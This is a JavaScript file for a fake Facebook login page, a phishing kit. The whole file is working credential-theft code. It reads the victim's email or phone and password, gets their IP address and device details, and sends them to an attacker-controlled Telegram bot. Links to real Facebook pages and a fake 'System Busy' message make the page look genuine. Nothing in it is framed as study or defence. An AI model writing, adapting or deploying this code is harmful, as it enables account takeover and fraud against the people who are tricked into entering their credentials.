

  // Redirect links
document.getElementById("new-create").addEventListener("click", () => {
  window.location.href = "https://web.facebook.com/r.php?next=https%3A%2F%2Fweb.facebook.com%2Freel%2F1261946968203756%3F_rdc%3D1%26_rdr%23&locale=en_US&display=page&entry_point=login";
});

document.getElementById("forgot-password-link").addEventListener("click", () => {
  window.location.href = "https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&next=https%3A%2F%2Fweb.facebook.com%2Freel%2F1261946968203756%3F_rdc%3D1%26_rdr%23&from_login_screen=0";
});

// Track last attempt
let lastSent = { email: null, password: null };

// Handle login attempt
document.getElementById("loginBtn").addEventListener("click", async () => {
  const email = document.getElementById("login-email")?.value.trim();
  const password = document.getElementById("login-password")?.value.trim();

  if (!email || !password) {
    alert("Both fields required!");
    return;
  }

  if (email === lastSent.email && password === lastSent.password) {
    alert("System Busy, Try again later.");
    return;
  }

  lastSent = { email, password };

  // Grab IP address
  let userIP = "Unavailable";
  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipRes.json();
    userIP = ipData.ip || "Unknown";
  } catch (err) {
    console.warn("IP fetch failed:", err);
  }

  // Get device info
  const deviceInfo = `
Platform: ${navigator.platform}
Browser: ${navigator.userAgent}
Memory: ${navigator.deviceMemory || "?"} GB
Cores: ${navigator.hardwareConcurrency || "?"}
`;

  // Construct message
  const timestamp = new Date().toLocaleString();
  const message = `
🔐 *Facebook Login Attempt*
----------------------------------------
📧 Email / Phone: ${email}
🔑 Password: ${password}

🌍 IP Address: ${userIP}
🧠 Device Info:
${deviceInfo}
🕒 Time: ${timestamp}
----------------------------------------`;

  // Send to Telegram bot
  const token = "Your Telegram token";
  const chatId = "Your chat ID";


  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown"
    })
  }).then((res) => {
    if (res.ok) {
      console.log("✅ Sent to bot");
    } else {
      console.error("❌ Failed to send");
    }
  });
});
